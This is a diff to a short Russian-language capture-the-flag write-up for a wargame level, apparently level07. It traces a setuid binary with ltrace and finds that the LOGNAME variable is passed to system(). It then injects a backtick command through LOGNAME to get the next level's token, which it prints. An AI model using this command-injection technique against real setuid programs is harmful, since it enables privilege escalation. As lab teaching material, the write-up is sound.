@@ -1,10 +1,10 @@
 level07
 
-ls
+> ls
 В папке бинарник ./level07
 
 Прогоняем через ltrace:
-ltrace ./level07
+> ltrace ./level07
     __libc_start_main(0x8048514, 1, 0xbffff7c4, 0x80485b0, 0x8048620 <unfinished ...>
     getegid()                                                                               = 2007
     geteuid()                                                                               = 2007
@@ -21,13 +21,13 @@ ltrace ./level07
 Видим, что в строке: getenv("LOGNAME") = "getflag"
 данные берутся из переменной среды LOGNAME и используются в системном вызове system()
 
-Следовательно нужно подменим переменную LOGNAME на getflag:
-export LOGNAME='`getflag`'
+Следовательно нужно подменить переменную LOGNAME на getflag:
+>export LOGNAME='`getflag`'
 
-./level07
+> ./level07
 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
 
-su level08
+> su level08
 fiumuikeil55xe9cu4dood66h
 
 Done!
